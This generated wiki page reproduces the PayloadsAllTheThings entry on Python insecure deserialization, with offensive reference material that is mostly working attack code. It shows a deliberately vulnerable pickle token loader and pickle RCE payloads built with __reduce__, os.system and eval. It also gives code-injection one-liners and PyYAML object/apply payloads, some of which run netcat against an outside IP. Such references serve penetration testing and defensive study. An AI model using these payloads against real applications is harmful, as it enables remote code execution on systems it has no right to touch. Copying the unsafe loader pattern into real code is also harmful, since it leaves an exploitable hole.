---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Python Deserialization

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-insecure-deserialization-python` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Deserialization/Python.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Python Deserialization](../../topics/insecure-deserialization/python-deserialization.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-insecure-deserialization-python |
| name | Python Deserialization |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Python.md |

## Preserved Source Material

````yaml
_body: "# Python Deserialization\n\n> Python deserialization is the process of reconstructing Python objects from serialized\
  \ data, commonly done using formats like JSON, pickle, or YAML. The pickle module is a frequently used tool for this in\
  \ Python, as it can serialize and deserialize complex Python objects, including custom classes.\n\n## Summary\n\n* [Tools](#tools)\n\
  * [Methodology](#methodology)\n    * [Pickle](#pickle)\n    * [PyYAML](#pyyaml)\n* [References](#references)\n\n## Tools\n\
  \n* [j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator)\
  \ - Serialized payload for deserialization RCE attack on python driven applications where pickle,PyYAML, ruamel.yaml or\
  \ jsonpickle module is used for deserialization of serialized data.\n\n## Methodology\n\nIn Python source code, look for\
  \ these sinks:\n\n* `cPickle.loads`\n* `pickle.loads`\n* `_pickle.loads`\n* `jsonpickle.decode`\n\n### Pickle\n\nThe following\
  \ code is a simple example of using `cPickle` in order to generate an auth_token which is a serialized User object.\n:warning:\
  \ `import cPickle` will only work on Python 2\n\n```python\nimport cPickle\nfrom base64 import b64encode, b64decode\n\n\
  class User:\n    def __init__(self):\n        self.username = \"anonymous\"\n        self.password = \"anonymous\"\n   \
  \     self.rank     = \"guest\"\n\nh = User()\nauth_token = b64encode(cPickle.dumps(h))\nprint(\"Your Auth Token : {}\"\
  ).format(auth_token)\n```\n\nThe vulnerability is introduced when a token is loaded from an user input.\n\n```python\nnew_token\
  \ = raw_input(\"New Auth Token : \")\ntoken = cPickle.loads(b64decode(new_token))\nprint \"Welcome {}\".format(token.username)\n\
  ```\n\nPython 2.7 documentation clearly states Pickle should never be used with untrusted sources. Let's create a malicious\
  \ data that will execute arbitrary code on the server.\n\n> The pickle module is not secure against erroneous or maliciously\
  \ constructed data. Never unpickle data received from an untrusted or unauthenticated source.\n\n```python\nimport cPickle,\
  \ os\nfrom base64 import b64encode, b64decode\n\nclass Evil(object):\n    def __reduce__(self):\n        return (os.system,(\"\
  whoami\",))\n\ne = Evil()\nevil_token = b64encode(cPickle.dumps(e))\nprint(\"Your Evil Token : {}\").format(evil_token)\n\
  ```\n\nA universal payload can be created by loading `os` at runtime using eval:\n\n```python\nimport pickle\nimport base64\n\
  \nclass RCE:\n    def __reduce__(self):\n        return eval, (\"__import__('os').system('whoami')\",)\npickled = pickle.dumps(RCE())\n\
  print(base64.b64encode(pickled).decode())\n```\n\nThis approach allows running arbitrary python code, which allows us to\
  \ use different techniques from code injection:\n\n```python\n__import__('os').system('whoami') # Reflected RCE\ngetattr('',\
  \ __import__('os').popen('whoami').read()) # Error-Based RCE\n1 / (__include__(\"os\").popen(\"id\")._proc.wait() == 0)\
  \ # Boolean-Based RCE\n__include__(\"os\").popen(\"id && sleep 5\").read() # Time-Based RCE\n```\n\n### PyYAML\n\nYAML deserialization\
  \ is the process of converting YAML-formatted data back into objects in programming languages like Python, Ruby, or Java.\
  \ YAML (YAML Ain't Markup Language) is popular for configuration files and data serialization because it is human-readable\
  \ and supports complex data structures.\n\n```yaml\n!!python/object/apply:time.sleep [10]\n!!python/object/apply:builtins.range\
  \ [1, 10, 1]\n!!python/object/apply:os.system [\"nc 10.10.10.10 4242\"]\n!!python/object/apply:os.popen [\"nc 10.10.10.10\
  \ 4242\"]\n!!python/object/new:subprocess [[\"ls\",\"-ail\"]]\n!!python/object/new:subprocess.check_output [[\"ls\",\"-ail\"\
  ]]\n```\n\n```yaml\n!!python/object/apply:subprocess.Popen\n- ls\n```\n\n```yaml\n!!python/object/new:str\nstate: !!python/tuple\n\
  - 'print(getattr(open(\"flag\\x2etxt\"), \"read\")())'\n- !!python/object/new:Warning\n  state:\n    update: !!python/name:exec\n\
  ```\n\nSince PyYaml version 6.0, the default loader for `load` has been switched to SafeLoader mitigating the risks against\
  \ Remote Code Execution. [PR #420 - Fix](https://github.com/yaml/pyyaml/issues/420)\n\nThe vulnerable sinks are now `yaml.unsafe_load`\
  \ and `yaml.load(input, Loader=yaml.UnsafeLoader)`.\n\n```py\nwith open('exploit_unsafeloader.yml') as file:\n        data\
  \ = yaml.load(file,Loader=yaml.UnsafeLoader)\n```\n\n## References\n\n* [CVE-2019-20477 - 0Day YAML Deserialization Attack\
  \ on PyYAML version <= 5.1.2 - Manmeet Singh (@_j0lt) - June 21, 2020](https://web.archive.org/web/20250501184227/https://thej0lt.com/2020/06/21/cve-2019-20477-0day-yaml-deserialization-attack-on-pyyaml-version/)\n\
  * [Exploiting misuse of Python's \"pickle\" - Nelson Elhage - March 20, 2011](https://web.archive.org/web/20260211161939/https://blog.nelhage.com/2011/03/exploiting-pickle/)\n\
  * [Python Yaml Deserialization - HackTricks - July 19, 2024](https://web.archive.org/web/20241216145404/https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)\n\
  * [PyYAML Documentation - PyYAML - April 29, 2006](https://web.archive.org/web/20260219140302/https://pyyaml.org/wiki/PyYAMLDocumentation)\n\
  * [YAML Deserialization Attack in Python - Manmeet Singh & Ashish Kukret - November 13, 2021](https://web.archive.org/web/20250604032318/https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)\n\
  * [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)"
_relative_path: Insecure Deserialization/Python.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Deserialization/Python.md
````
